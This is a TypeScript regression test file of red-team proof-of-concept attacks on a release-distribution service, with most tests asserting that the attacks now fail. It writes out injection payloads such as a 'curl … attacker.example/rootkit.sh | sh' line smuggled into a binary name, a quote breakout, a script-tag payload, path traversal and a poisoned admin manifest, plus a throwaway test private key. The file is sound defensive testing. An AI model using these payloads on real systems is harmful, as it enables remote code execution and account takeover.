/**
 * RED TEAM R6 — Release-channel poisoning PoCs.
 *
 * Every test here is an ATTACK. They were written to assert the *vulnerable* behaviour;
 * post-remediation each one asserts that the same attack now FAILS. Test names are
 * unchanged so the mapping back to docs/security/findings/R6-release.md survives.
 *
 * Still-green attacks (R6-08 redirect handling, R6-09 CDATA, R6-10 downgrade, R6-11 portal,
 * and the request-Host origin) document findings that were deliberately NOT remediated in
 * this pass — see the Remediation section of the finding doc.
 */

import { describe, expect, it } from "vitest";
import { makeTestDb } from "../helpers.js";
import { KvMock } from "../kvMock.js";
import { makeEnv, NOW, seedLicenseWithKey, seedProduct } from "../seed.js";
import type { Db } from "../../src/db/types.js";
import type { Env } from "../../src/env.js";
import type { Product } from "../../src/core/products.js";
import {
  DEFAULT_AUTO_ISSUE,
  DEFAULT_FINGERPRINT_POLICY,
} from "../../src/fingerprint.js";
import { DEFAULT_SERVICES } from "../../src/core/services.js";
import type { FetchImpl } from "../../src/release/githubApp.js";
import type { Arch } from "../../src/release/assets.js";
import type { Release, ReleaseAsset } from "../../src/release/github.js";
import { handleRelease } from "../../src/release/index.js";
import { renderAppcast } from "../../src/release/appcast.js";
import { defaultInstallScript } from "../../src/release/install.js";
import { linkRepo } from "../../src/release/linkRepo.js";
import { handleGithubWebhook } from "../../src/githubWebhook.js";
import { getReleaseConfig } from "../../src/release/index.js";
import { handlePortalDownload } from "../../src/portal/api.js";
import {
  createPortalDownloadToken,
  getOrCreateAccountByEmail,
  syncAccountLicenseLinks,
} from "../../src/portal/repo.js";

// ── Shared harness ───────────────────────────────────────────────────────────

const SLUG = "djdl";

// A throwaway 2048-bit RSA private key (PKCS#8 PEM) so the App-JWT signer runs. Test only.
const TEST_RSA_PKCS8 = `-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCsEMREsWAll4vT
9mDM1zr8yF9klknqOJPqLj/1SvQx3IJNKks0LfEhPK+1LqTIrALhx3UM3N8hmmY6
Kk7C8cXsA0b49QtF/KtFPFnK+cSBGtOmZMJ7tJBQhUswWeJ2BPr24sDJZaCS4JH5
QlCi2g7Lchwkzp6d2H23rm9CD8LT6OPcgXnALdM4wfQ3Wa1gklDi0zd29FyKsdtF
3PjhzUVn7xRJQFOQU3vOqizauuYvM2WmV9K3BnkZZyPRgSVIEggBwlyrJLBSVZYI
8C2zmxLs7SeUaoq29rewma3h5mLhwL62VN0WC6B7rM18cifR0sR46VVc3/2gNAZ3
BxnHKG+TAgMBAAECggEAAvfVEuRGZs+a62CcIdxymYqxTpBjHQW103vRwZ714GhP
3RnmKzPBrZOY6lSwJgAFmrRwmfSzaqZ5rfYt3qICCoSx9Dhx5daqc6rLV7uAPsPi
M8QYML8YIDN0bRSX2fZTB/A4aCD3KKF0EysoLe76A1toDeB8jvd9j64UID0aXMJn
7UNX6BrmAj36r/gUZNiIPDQRg0RZV+weDv8Q0BG2yE6wpA2B5jdEJbX4jq7Tr2WU
3xJlG2GBOt1kNcaVKlr2FmF+3xFAdafJW/AYaMBL5EWytiMqP9bu/H3cm/laphKA
+phJ2fGgw094+ZS+fP2Qja7yqI6/6rDg53pGWCVuVQKBgQDhvS/Q8BM2dJIZUy+B
KZpZKuQSKvYvKvuNvjkuUSj8XA6AvfehcQWWJRngB7S1cYJoANsO3KvAyHQ4RUe9
s6AHDGJljnB/kfqMdQKbMtmw7u8MEtLRHCELZ0eVcd/8nHBmCgkCe1sj8OmXBVkN
pqW16lfsLu58g8u/qzPRrRQ+bwKBgQDDIaKwhhl0UD9+9wNBLZZ2lurLUiNnK4ZM
0yHaYselF8WkBRRlpTYJrEEYetlFLxToNlqk4VlWES0ZtJQ5SQJgqzG2cmMApvAJ
hurjuDBPaGcu56K7wUobYFbw9aNM7Nnm+Tpt+DehIJ48rjBMKSBAqLj2QXBSP+ST
QU/BYgbzHQKBgBFz+h1yYlnke2M/3j1jRQ691TJeZfhRn29fFLazCbMxPuHPTjUK
Mv9f0PdUQTGCHC4EWut0PkdCeFHdcWWGXMoOuBDYCXSjibaQWWo8bT5TyuGpFumZ
/igOjSdNzZ6PTdVl0zqA5RQLTVQi0rbOeqNtAe0916yC2B7ykqgUdKs7AoGBAI2L
MYsgywgPSe/cWDUIT5OYZ5qy61FkRhgmMvFKJA3Cj7ApqyEMVYVwuQt72W0Q+PZ0
rw3ZFUeUUAXMcpSXPC1JIVd55AzOC2KtxmcG7aw8TFS+29GcJRh0qrxBQoKDcJDW
CqdInXm4wm+73vbwAiBFA15GG6beB/01LBhX9jiVAoGBAM2aHdDaIHzO71WMB7Qi
6e6lkI53ovO8vzw/hITzvTqbEslxweqRjv0LHwMo1/+zdFtnxyWHUTFQtT4VM7FV
86FY7DjzErSUSOhQfXvKGVvy2oAYxQUqqJgHI2iowSMVNg1O45wW4O3eUsJuMx06
d+RKUGe97dQXkny7eE7qJPbg
-----END PRIVATE KEY-----`;

function envFor(): Env {
  const env = makeEnv(new KvMock(), [SLUG]);
  env.GITHUB_APP_ID = "12345";
  env.GITHUB_APP_PRIVATE_KEY = TEST_RSA_PKCS8;
  return env;
}

function asset(name: string, id = name.length, size = 4096): ReleaseAsset {
  return {
    id,
    name,
    size,
    content_type: "application/octet-stream",
    browser_download_url: `https://example/${name}`,
  };
}

function release(over: Partial<Release> = {}): Release {
  return {
    tag_name: "v1.2.3",
    name: "1.2.3",
    body: null,
    published_at: "2026-01-02T03:04:05Z",
    html_url: "https://github.com/acme/djdl/releases/tag/v1.2.3",
    prerelease: false,
    draft: false,
    assets: [],
    ...over,
  };
}

function makeProduct(slug = SLUG): Product {
  return {
    slug,
    name: slug,
    signingKid: "kid",
    signingKeyPem: "pem",
    signingPub: null,
    compatMin: "0.0.0",
    compatMax: "99.0.0",
    defaultMaxOfflineDays: 30,
    defaultDeviceLimit: 5,
    adminGroup: null,
    schemaVersion: 1,
    fingerprintPolicy: DEFAULT_FINGERPRINT_POLICY,
    autoIssue: DEFAULT_AUTO_ISSUE,
    services: DEFAULT_SERVICES,
    registration: "requires-license",
  };
}

async function seedReleaseConfig(
  db: Db,
  over: Record<string, unknown> = {},
): Promise<void> {
  await seedProduct(db, SLUG);
  const row = {
    product: SLUG,
    gh_owner: "acme",
    gh_repo: "djdl",
    gh_installation_id: 42,
    channel_workflow: "channel.yml",
    beta_branch: "main",
    manual_channels_json: null as string | null,
    binary_name: "djdl",
    install_template: null as string | null,
    sparkle_ed25519_pub: "PUBKEY==",
    summary_marker: "pkey:summary",
    artifact_policy_json: null as string | null,
    metadata_access: "public",
    artifacts_access: "public",
    ...over,
  };
  await db.run(
    `INSERT INTO release_config
       (product, gh_owner, gh_repo, gh_installation_id, channel_workflow, beta_branch,
        manual_channels_json, binary_name, install_template, sparkle_ed25519_pub, summary_marker,
        artifact_policy_json, metadata_access, artifacts_access)
     VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
    row.product,
    row.gh_owner,
    row.gh_repo,
    row.gh_installation_id,
    row.channel_workflow,
    row.beta_branch,
    row.manual_channels_json,
    row.binary_name,
    row.install_template,
    row.sparkle_ed25519_pub,
    row.summary_marker,
    row.artifact_policy_json,
    row.metadata_access,
    row.artifacts_access,
  );
}

interface Call {
  url: string;
  init?: RequestInit;
}

/** URL-substring routed fetch stub that records the full (url, init) of every call. */
function stubFetch(routes: Array<[string, () => Response]>): {
  fetchImpl: FetchImpl;
  calls: Call[];
} {
  const calls: Call[] = [];
  const fetchImpl: FetchImpl = async (input, init) => {
    const url = String(input);
    calls.push({ url, ...(init ? { init } : {}) });
    if (url.includes("/access_tokens")) {
      return new Response(JSON.stringify({ token: "ghs_installation_token" }), {
        status: 200,
      });
    }
    for (const [needle, build] of routes) {
      if (url.includes(needle)) return build();
    }
    return new Response("not found", { status: 404 });
  };
  return { fetchImpl, calls };
}

function req(url = "https://key.plrs.im/djdl/version"): Request {
  return new Request(url) as unknown as Request;
}

// ── .pkey/ manifest harness (link + webhook resync) ──────────────────────────

function contentsResponse(text: string): Response {
  const b64 = Buffer.from(text, "utf8").toString("base64");
  return new Response(JSON.stringify({ content: b64, encoding: "base64" }), {
    status: 200,
  });
}

/** A mutable `.pkey/` file map so a test can "push a commit" between calls. */
function pkeyFetch(files: Record<string, string>): {
  fetchImpl: FetchImpl;
  calls: Call[];
  files: Record<string, string>;
} {
  const calls: Call[] = [];
  const fetchImpl: FetchImpl = async (input, init) => {
    const url = String(input);
    calls.push({ url, ...(init ? { init } : {}) });
    if (url.includes("/installation"))
      return new Response(JSON.stringify({ id: 4242 }), { status: 200 });
    if (url.includes("/access_tokens"))
      return new Response(JSON.stringify({ token: "ghs_installation_token" }), {
        status: 200,
      });
    if (url.includes("/contents/")) {
      for (const [path, body] of Object.entries(files)) {
        if (url.includes(`/contents/${path}`)) return contentsResponse(body);
      }
      return new Response("not found", { status: 404 });
    }
    return new Response("not found", { status: 404 });
  };
  return { fetchImpl, calls, files };
}

const SCHEMA_JSON = JSON.stringify({
  schemaVersion: 1,
  entries: [
    {
      key: "run.concurrency",
      kind: "config",
      category: "run",
      label: "Concurrency",
      description: "",
      schema: { type: "integer", minimum: 1 },
    },
  ],
});

const PRODUCT_JSON = JSON.stringify({
  slug: "acme",
  name: "Acme",
  compatMin: "1.0.0",
  compatMax: "9.0.0",
  adminGroup: "acme-admins",
  tiers: [{ id: "pro", label: "Pro" }],
});

/** The same manifest as a repo *writer* would rewrite it: new IdP, new admin group, fat tier. */
const ATTACKER_PRODUCT_JSON = JSON.stringify({
  slug: "acme",
  name: "Acme",
  compatMin: "1.0.0",
  compatMax: "9.0.0",
  adminGroup: "attacker-controlled-group",
  oidc: {
    provider: "custom",
    issuer: "https://idp.attacker.example",
    clientId: "attacker-client",
    clientSecretSecret: "OIDC_SECRET__ACME",
    redirectUris: ["https://attacker.example/cb"],
    groupRoleMap: { everyone: { role: "admin" } },
  },
  tiers: [{ id: "pro", label: "Pro", policyDeviceLimit: 100000 }],
});

function releaseJson(over: Record<string, unknown> = {}): string {
  return JSON.stringify({
    release: {
      ghOwner: "acme-org",
      ghRepo: "acme-app",
      binaryName: "acme",
      betaBranch: "main",
      summaryMarker: "pkey:summary",
      sparkleEd25519Pub: "PUBKEY==",
      ...over,
    },
  });
}

function hex(bytes: Uint8Array): string {
  return [...bytes].map((b) => b.toString(16).padStart(2, "0")).join("");
}

/** Build a *validly HMAC-signed* GitHub push delivery. */
async function signedPush(
  payload: unknown,
  secret: string,
): Promise<{ body: string; signature: string }> {
  const body = JSON.stringify(payload);
  const key = await crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode(secret),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"],
  );
  const sig = new Uint8Array(
    await crypto.subtle.sign(
      "HMAC",
      key,
      new TextEncoder().encode(body) as BufferSource,
    ),
  );
  return { body, signature: `sha256=${hex(sig)}` };
}

function deliveryRequest(delivery: {
  body: string;
  signature: string;
}): Request {
  return new Request("https://key.plrs.im/webhooks/github", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "x-github-event": "push",
      "x-hub-signature-256": delivery.signature,
      // Derived from the signed bytes, so replaying the SAME captured delivery replays the
      // same GUID (that is the whole point of the R6-06 replay test) while distinct
      // deliveries get distinct GUIDs.
      "x-github-delivery": delivery.signature.slice(7, 43),
    },
    body: delivery.body,
  }) as unknown as Request;
}

function pushPayload(over: Record<string, unknown> = {}): unknown {
  return {
    ref: "refs/heads/main",
    after: "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
    // The installation `pkeyFetch` reports for this repo; the handler binds to it.
    installation: { id: 4242 },
    repository: {
      name: "acme-app",
      full_name: "acme-org/acme-app",
      default_branch: "main",
      owner: { login: "acme-org" },
    },
    head_commit: { modified: [".pkey/release.json"] },
    commits: [],
    ...over,
  };
}

// ═════════════════════════════════════════════════════════════════════════════
// R6-01 — install.sh RCE via repo-controlled binary_name
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-01 install.sh command injection via .pkey-controlled binaryName", () => {
  // FIXED (R6-01): `renderInstallScript` refuses to render a context outside its safe
  // character classes, so a legacy/poisoned `binary_name` fails closed with a 404 instead
  // of emitting a script with attacker lines above `set -eu`.
  it("a newline in binaryName injects arbitrary shell into the served installer", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db, {
      // Exactly what `String(rel.binaryName)` yields for a YAML/JSON block scalar.
      binary_name:
        "djdl\ncurl -fsSL https://attacker.example/rootkit.sh | sh\n#",
    });
    const { fetchImpl } = stubFetch([]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/install.sh"),
      envFor(),
      db,
      makeProduct(),
      "install",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(404);
    const script = await res.text();
    expect(script).not.toContain("attacker.example");
    expect(script.split("\n")).not.toContain(
      "curl -fsSL https://attacker.example/rootkit.sh | sh",
    );
    expect(res.headers.get("content-type")).not.toContain("text/x-shellscript");
  });

  // FIXED (R6-01): the same gate catches the quote-breakout variant.
  it("a double quote in binaryName breaks out of the quoted URL assignment", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db, {
      binary_name: 'djdl"; id > /tmp/pwned; :"',
    });
    const { fetchImpl } = stubFetch([]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/install.sh"),
      envFor(),
      db,
      makeProduct(),
      "install",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(404);
    const script = await res.text();
    expect(script).not.toContain("/tmp/pwned");
    expect(script).not.toContain("URL=");
  });

  // FIXED (R6-01): the manifest boundary rejects the whole `.pkey/` document, so the
  // poisoned `binary_name` never reaches `release_config` in the first place.
  it("END-TO-END: a push to .pkey/release.json rewrites binary_name and poisons install.sh", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });

    const linked = await linkRepo(
      env,
      db,
      "acme-org/acme-app",
      NOW,
      stub.fetchImpl,
    );
    expect(linked.ok).toBe(true);
    expect((await getReleaseConfig(db, "acme"))?.binary_name).toBe("acme");

    // The attacker (anyone with push access to .pkey/ on the default branch) edits one field.
    stub.files[".pkey/release.json"] = releaseJson({
      binaryName: "acme\ncurl -fsSL https://attacker.example/x | sh\n#",
    });

    const res = await handleGithubWebhook(
      deliveryRequest(await signedPush(pushPayload(), "webhook-secret")),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      ok: boolean;
      products: Array<{ ok: boolean; errors?: string[] }>;
    };
    // The resync failed manifest validation rather than applying the poisoned value.
    expect(body.ok).toBe(false);
    expect(body.products[0]?.errors?.join("\n")).toContain(
      "release.binaryName must match",
    );
    expect((await getReleaseConfig(db, "acme"))?.binary_name).toBe("acme");

    const installed = await handleRelease(
      req("https://key.plrs.im/acme/install.sh"),
      env,
      db,
      makeProduct("acme"),
      "install",
      {},
      stub.fetchImpl,
    );
    expect(installed.status).toBe(200);
    const script = await installed.text();
    expect(script).not.toContain("attacker.example");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-02 — install.sh ships no integrity verification at all
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-02 install.sh performs no integrity verification", () => {
  // FIXED (R6-02): the script fetches the artifact's published `.sha256`, verifies it, and
  // aborts before `chmod +x` on mismatch — or when no checksum is published at all.
  it("downloads → chmod +x → mv with no checksum, signature, or Gatekeeper check", () => {
    const script = defaultInstallScript({
      origin: "https://key.plrs.im",
      cliBase: "/djdl/cli",
      binaryName: "djdl",
      channels: ["staging", "beta"],
      versionEnv: "DJDL_VERSION",
    });
    expect(script).toContain('curl -fL --progress-bar -o "$TMP" "$URL"');
    expect(script).toContain('wget -q -O "$TMP" "$URL"');

    // An integrity primitive is now emitted, for both download paths.
    expect(script).toContain('SHA_URL="$URL?checksum=sha256"');
    for (const token of [
      "shasum -a 256",
      "sha256sum",
      "openssl dgst -sha256",
    ]) {
      expect(script).toContain(token);
    }
    // Verification happens BEFORE the binary is made executable / moved into place.
    const lines = script.split("\n");
    const idx = (needle: string): number =>
      lines.findIndex((l) => l.includes(needle));
    expect(idx('ACTUAL_SHA256" != "$EXPECTED_SHA256')).toBeGreaterThan(-1);
    expect(idx('ACTUAL_SHA256" != "$EXPECTED_SHA256')).toBeLessThan(
      idx('chmod +x "$TMP"'),
    );
    expect(idx('ACTUAL_SHA256" != "$EXPECTED_SHA256')).toBeLessThan(
      idx('mv "$TMP" "$TARGET"'),
    );
    // No published checksum ⇒ refuse, rather than install unverified.
    expect(script).toContain('if [ -z "$EXPECTED_SHA256" ]; then');
    expect(script).toContain("Refusing to install an unverified binary.");
    // The false "the binary is expected to be notarized" claim is gone.
    expect(script.toLowerCase()).not.toContain("notariz");
  });

  it("serves the published .sha256 sidecar so the installer can verify the download", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const digest = "a".repeat(64);
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777), asset("djdl-arm64.sha256", 778)],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(rel), { status: 200 }),
      ],
      [
        "/releases/assets/778",
        () => new Response(`${digest}  djdl-arm64\n`, { status: 200 }),
      ],
    ]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64?checksum=sha256"),
      envFor(),
      db,
      makeProduct(),
      "cli",
      { version: "1.2.3", arch: "arm64" },
      fetchImpl,
    );
    expect(res.status).toBe(200);
    expect((await res.text()).trim()).toBe(digest);

    // A release with no sidecar 404s, so `curl -fsSL` fails and the script aborts.
    const bare = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    const { fetchImpl: noSums } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(bare), { status: 200 }),
      ],
    ]);
    const missing = await handleRelease(
      req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64?checksum=sha256"),
      envFor(),
      db,
      makeProduct(),
      "cli",
      { version: "1.2.3", arch: "arm64" },
      noSums,
    );
    expect(missing.status).toBe(404);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-03 — Sparkle edSignature is copied verbatim, never verified
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-03 Sparkle signature is relayed, not verified", () => {
  // FIXED (R6-03): the sidecar is Ed25519-verified against `sparkle_ed25519_pub` over the
  // DMG's own bytes; anything that does not verify drops the item and 404s the feed.
  it("copies arbitrary .sig bytes into sparkle:edSignature and never uses the configured pubkey", async () => {
    const db = makeTestDb();
    // A structurally valid Ed25519 public key that did NOT sign this DMG.
    await seedReleaseConfig(db, {
      sparkle_ed25519_pub: "Nk8lJcJ5X0m5eB1yPq0M9y0eYkWq3rZ8k6JX2Yr7cQI=",
    });
    const rel = release({
      assets: [
        asset("djdl-arm64.dmg", 100, 4096),
        asset("djdl-arm64.dmg.sig", 101),
      ],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases?per_page",
        () => new Response(JSON.stringify([rel]), { status: 200 }),
      ],
      // Not a signature at all — just attacker-chosen text in the sidecar asset.
      [
        "/releases/assets/101",
        () =>
          new Response("TOTALLY-BOGUS-NOT-A-SIGNATURE==\n", { status: 200 }),
      ],
      ["/releases/assets/100", () => new Response("DMG-BYTES")],
    ]);

    const res = await handleRelease(
      req("https://key.plrs.im/djdl/appcast.xml"),
      envFor(),
      db,
      makeProduct(),
      "appcast",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(404);
    const xml = await res.text();
    expect(xml).not.toContain("sparkle:edSignature");
    expect(xml).not.toContain("TOTALLY-BOGUS-NOT-A-SIGNATURE==");
  });

  // FIXED (R6-03): a genuine signature over the DMG's bytes still renders, so the check is
  // a real verification and not a blanket denial.
  it("emits sparkle:edSignature only for a signature that verifies against the configured key", async () => {
    const db = makeTestDb();
    const dmgBytes = new TextEncoder().encode("REAL-DMG-BYTES");
    const pair = (await crypto.subtle.generateKey({ name: "Ed25519" }, true, [
      "sign",
      "verify",
    ])) as CryptoKeyPair;
    const b64 = (bytes: Uint8Array): string =>
      btoa(String.fromCharCode(...bytes));
    const pub = b64(
      new Uint8Array(
        (await crypto.subtle.exportKey("raw", pair.publicKey)) as ArrayBuffer,
      ),
    );
    const sigB64 = b64(
      new Uint8Array(
        await crypto.subtle.sign(
          { name: "Ed25519" },
          pair.privateKey,
          dmgBytes as BufferSource,
        ),
      ),
    );
    await seedReleaseConfig(db, { sparkle_ed25519_pub: pub });
    const rel = release({
      assets: [
        asset("djdl-arm64.dmg", 100, 4096),
        asset("djdl-arm64.dmg.sig", 101),
      ],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases?per_page",
        () => new Response(JSON.stringify([rel]), { status: 200 }),
      ],
      ["/releases/assets/101", () => new Response(sigB64)],
      [
        "/releases/assets/100",
        () => new Response(dmgBytes as unknown as BodyInit),
      ],
    ]);

    const res = await handleRelease(
      req("https://key.plrs.im/djdl/appcast.xml"),
      envFor(),
      db,
      makeProduct(),
      "appcast",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(200);
    expect(await res.text()).toContain(`sparkle:edSignature="${sigB64}"`);
  });

  it("REPO-CONTROLLED POLICY: .pkey/release.json can set requireSparkleSignature:false and ship an unsigned feed", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);
    // Before: a Sparkle key is configured, so an unsigned feed fails closed.
    expect((await getReleaseConfig(db, "acme"))?.sparkle_ed25519_pub).toBe(
      "PUBKEY==",
    );

    // The repo tries to disarm the platform's own signing requirement in one push.
    stub.files[".pkey/release.json"] = releaseJson({
      sparkleEd25519Pub: "",
      artifactPolicy: { requireSparkleSignature: false },
    });
    const hook = await handleGithubWebhook(
      deliveryRequest(await signedPush(pushPayload(), "webhook-secret")),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(hook.status).toBe(200);
    const cfg = await getReleaseConfig(db, "acme");
    expect(cfg?.sparkle_ed25519_pub).toBeNull();
    // FIXED (R6-03): `requireSparkleSignature` is no longer part of the manifest contract,
    // so the push cannot write it into the operator-owned artifact policy.
    expect(cfg?.artifact_policy_json).not.toContain("requireSparkleSignature");

    // ...and the unsigned feed the repo was angling for now fails closed.
    const rel = release({ assets: [asset("acme-arm64.dmg", 100, 4096)] });
    const appcastFetch: FetchImpl = async (input) => {
      const url = String(input);
      if (url.includes("/access_tokens"))
        return new Response(JSON.stringify({ token: "t" }), { status: 200 });
      if (url.includes("/releases?per_page"))
        return new Response(JSON.stringify([rel]), { status: 200 });
      return new Response("nf", { status: 404 });
    };
    const res = await handleRelease(
      req("https://key.plrs.im/acme/appcast.xml"),
      env,
      db,
      makeProduct("acme"),
      "appcast",
      {},
      appcastFetch,
    );
    expect(res.status).toBe(404);
    expect(await res.text()).not.toContain("/acme/dmg/1.2.3/acme-arm64.dmg");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-04 — Artifact responses relay attacker Content-Type and strip Content-Disposition
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-04 artifact streaming relays a repo-chosen Content-Type with no nosniff", () => {
  it("serves text/html from the platform origin and drops the upstream Content-Disposition", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(rel), { status: 200 }),
      ],
      [
        "/releases/assets/777",
        () =>
          new Response(
            "<script>fetch('/manage/api/me').then(r=>r.text())</script>",
            {
              status: 200,
              headers: {
                // GitHub serves the asset's registered content_type…
                "Content-Type": "text/html; charset=utf-8",
                // …and a protective disposition the worker does NOT copy.
                "Content-Disposition": 'attachment; filename="djdl-arm64"',
              },
            },
          ),
      ],
    ]);

    const res = await handleRelease(
      req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64"),
      envFor(),
      db,
      makeProduct(),
      "cli",
      { version: "1.2.3", arch: "arm64" },
      fetchImpl,
    );
    expect(res.status).toBe(200);
    // FIXED (R6-04): the repo-chosen upstream Content-Type is never relayed…
    expect(res.headers.get("content-type")).toBe("application/octet-stream");
    // …the protective disposition is always sent…
    expect(res.headers.get("content-disposition")).toBe(
      'attachment; filename="djdl-arm64"',
    );
    // …and every release response now carries the platform security headers.
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(res.headers.get("content-security-policy")).toContain(
      "default-src 'self'",
    );
    expect(res.headers.get("x-frame-options")).toBe("DENY");
    // The bytes still stream through — they simply can't execute as same-origin script.
    expect(await res.text()).toContain("<script>");
  });

  // NOT FIXED — R6-11 (origin from the request Host) is out of this remediation's scope.
  it("the served origin is taken from the request Host, not from configuration", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const { fetchImpl } = stubFetch([]);
    const res = await handleRelease(
      // `new URL(req.url).origin` — in workerd req.url is built from the Host header.
      req("https://attacker.example/djdl/install.sh"),
      envFor(),
      db,
      makeProduct(),
      "install",
      {},
      fetchImpl,
    );
    const script = await res.text();
    // Still Host-derived, but now emitted as a shell-quoted literal (R6-01).
    expect(script).toContain("ORIGIN='https://attacker.example'");
    expect(script).toContain(
      "curl -fsSL https://attacker.example/djdl/cli/install.sh | sh",
    );
  });

  // FIXED (R6-04): `appSecurityHeaders` is applied to every release response.
  it("the appcast / install.sh surfaces carry no security headers either", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const { fetchImpl } = stubFetch([]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/install.sh"),
      envFor(),
      db,
      makeProduct(),
      "install",
      {},
      fetchImpl,
    );
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(res.headers.get("content-security-policy")).toContain(
      "default-src 'self'",
    );
    expect(res.headers.get("x-frame-options")).toBe("DENY");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-05 — channel_workflow is interpolated raw into an authenticated GitHub URL
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-05 channel_workflow path/query injection on the installation-token client", () => {
  it("dot-segments in channel_workflow redirect the token-bearing GET to an arbitrary api.github.com path", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db, {
      // Manifest-controlled: `channelWorkflow: String(rel.channelWorkflow ?? "")` — unvalidated.
      channel_workflow: "../../../../../orgs/attacker-org/repos#",
    });
    const { fetchImpl, calls } = stubFetch([
      [
        "/releases?per_page",
        () =>
          new Response(JSON.stringify([release({ prerelease: true })]), {
            status: 200,
          }),
      ],
      // Whatever endpoint we actually hit answers 200 with a non-runs shape.
      ["api.github.com", () => new Response("[]", { status: 200 })],
    ]);

    // FIXED (R6-07): `channel_workflow` is encodeURIComponent'd, so the dot-segments stay
    // inside the workflow path segment and cannot re-target the request. The off-shape
    // response is also guarded, so the route no longer throws.
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/beta/appcast.xml"),
      envFor(),
      db,
      makeProduct(),
      "channelAppcast",
      { channel: "beta" },
      fetchImpl,
    );
    expect(res.status).toBe(404);

    // No request ever normalised onto the injected endpoint — every GitHub call stayed
    // inside the configured repo.
    for (const call of calls) {
      const { pathname } = new URL(call.url);
      expect(pathname).not.toBe("/orgs/attacker-org/repos");
      expect(pathname.split("/")).not.toContain("orgs");
    }
    // …the workflow name stayed a single, encoded path segment.
    const runs = calls.find((c) => c.url.includes("/actions/workflows/"));
    expect(runs).toBeDefined();
    expect(new URL(runs!.url).pathname).toBe(
      "/repos/acme/djdl/actions/workflows/..%2F..%2F..%2F..%2F..%2Forgs%2Fattacker-org%2Frepos%23/runs",
    );
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-06 — arch aliases from the router reach ARCH_TOKENS[undefined]
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-06 aarch64 / amd64 route aliases raise an unhandled TypeError", () => {
  const cases: Array<["cli" | "dmg", Arch]> = [
    ["dmg", "aarch64" as Arch],
    ["dmg", "amd64" as Arch],
    ["cli", "aarch64" as Arch],
    ["cli", "amd64" as Arch],
  ];
  // FIXED (R6-08): `normalizeArch` canonicalises the aliases before they reach ARCH_TOKENS,
  // so the aliases resolve to the real arm64/x86_64 asset instead of throwing a 500.
  for (const [kind, arch] of cases) {
    it(`${kind} + ${arch} throws instead of 404`, async () => {
      const db = makeTestDb();
      await seedReleaseConfig(db);
      const rel = release({
        tag_name: "v1.2.3",
        assets: [asset("djdl-arm64.dmg", 100), asset("djdl-arm64", 101)],
      });
      const { fetchImpl } = stubFetch([
        [
          "/releases/tags/",
          () => new Response(JSON.stringify(rel), { status: 200 }),
        ],
        ["/releases/assets/", () => new Response("BINARY", { status: 200 })],
      ]);
      const res = await handleRelease(
        req(`https://key.plrs.im/djdl/${kind}/1.2.3/djdl-${arch}`),
        envFor(),
        db,
        makeProduct(),
        kind,
        { version: "1.2.3", arch },
        fetchImpl,
      );
      // `aarch64` resolves to the arm64 asset; `amd64` has no x86_64 asset here, so 404 —
      // never an unhandled TypeError.
      expect([200, 404]).toContain(res.status);
    });
  }
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-07 — webhook: attacker-chosen ref + no replay protection
// ═════════════════════════════════════════════════════════════════════════════

